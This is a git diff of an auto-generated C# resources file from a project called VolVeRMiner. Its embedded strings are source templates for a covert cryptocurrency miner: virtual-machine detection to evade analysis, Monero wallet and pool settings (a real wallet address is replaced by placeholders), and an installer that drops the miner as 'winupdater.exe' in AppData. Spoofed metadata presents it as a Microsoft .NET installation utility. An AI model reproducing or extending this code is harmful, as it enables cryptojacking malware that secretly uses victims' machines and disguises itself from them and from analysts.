@@ -61,6 +61,35 @@ namespace VolVeRMiner.Properties {
         }
         
         /// <summary>
+        ///   Ищет локализованную строку, похожую на using System.Management;
+        ///using System;
+        ///using System.Net.NetworkInformation;
+        ///using System.Runtime.InteropServices;
+        ///
+        ///namespace MinerAns
+        ///{
+        ///   
+        ///
+        ///
+        ///    public class Analysis
+        ///    {
+        ///
+        ///        public static bool DetectVirtualMachine()
+        ///        {
+        ///       
+        ///                using (var searcher = new ManagementObjectSearcher(&quot;Select * from Win32_ComputerSystem&quot;))
+        ///                {
+        ///                    using (var items = searcher.Get())
+        ///                    {
+        ///                        foreach (var item in ite [остаток строки не уместился]&quot;;.
+        /// </summary>
+        internal static string Analysis {
+            get {
+                return ResourceManager.GetString("Analysis", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Ищет локализованную строку, похожую на using System;
         ///using System.Collections.Generic;
         ///using System.IO;
@@ -74,10 +103,11 @@ namespace VolVeRMiner.Properties {
         ///    internal class config
         ///    {
         ///        public static string moneroUsage = &quot;25&quot;;
-        ///        public static string moneroWallet = &quot;4A7Vqgr9mBV6xnWaSixFsrMU41oUtdatRFyyDctHGTYYRzsE7dKLEx4FwiNXzk5qW2ATZ9ust7EH1YAHP4mHWkiyQm8PmMx&quot;;
-        ///        public static string moneroPool = &quot;pool.hashvault.pro:80&quot;;
-        ///        public static string etcWallet = &quot;1&quot;;
-        ///      [остаток строки не уместился]&quot;;.
+        ///        public static string moneroWallet = &quot;monowallet&quot;;
+        ///        public static string moneroPool = &quot;monopool&quot;;
+        ///        public static string etcWallet = &quot;etcwallet&quot;;
+        ///        public static string etcPool = &quot;etcpool&quot;;
+        ///        public static string ethWallet = &quot;et [остаток строки не уместился]&quot;;.
         /// </summary>
         internal static string config {
             get {
@@ -91,18 +121,19 @@ namespace VolVeRMiner.Properties {
         ///using System.IO;
         ///using System.Threading;
         ///using System.Windows.Forms;
+        ///using VolVeR;
         ///
         ///
         ///namespace VolVeRFMI
         ///{
         ///    public class Installer
         ///    {
-        ///        public FileInfo FileName = new FileInfo(&quot;winupdater.exe&quot;); // Задаем имя нашего майнера
-        ///        public DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), &quot;Windows&quot;)); // Задаем путь в appdata
+        ///        public FileInfo FileName = new FileInfo(&quot;winupdater&quot; + &quot;.exe&quot;); 
+        ///        public  DirectoryInfo DirectoryName = new    DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), &quot;DRR&quot;)); 
         /// 
         ///        public void IsInstalled()
         ///        {
-        ///     [остаток строки не уместился]&quot;;.
+        ///            Path.Combine(DirectoryNa [остаток строки не уместился]&quot;;.
         /// </summary>
         internal static string Installer {
             get {
@@ -134,17 +165,12 @@ namespace VolVeRMiner.Properties {
         ///using System.Threading;
         ///using VolVeR.Properties;
         ///using VolVeRFMI;
+        ///using VolVeR;
         ///
-        ///namespace VolVeR
-        ///{
-        ///    class Program
-        ///    {
-        ///        public static void Main(string[] args)
-        ///        {
-        ///            try
-        ///            {
-        ///                new Installer().Run();
-        ///            [остаток строки не уместился]&quot;;.
+        ///
+        ///    [assembly: AssemblyTitle(&quot;Installation Utility&quot;)]
+        ///    [assembly: AssemblyDescription(&quot;Microsoft .NET Services Installation Utility&quot;)]
+        ///    [assembly: AssemblyCompany(&quot; [остаток строки не уместился]&quot;;.
         /// </summary>
         internal static string Program {
             get {
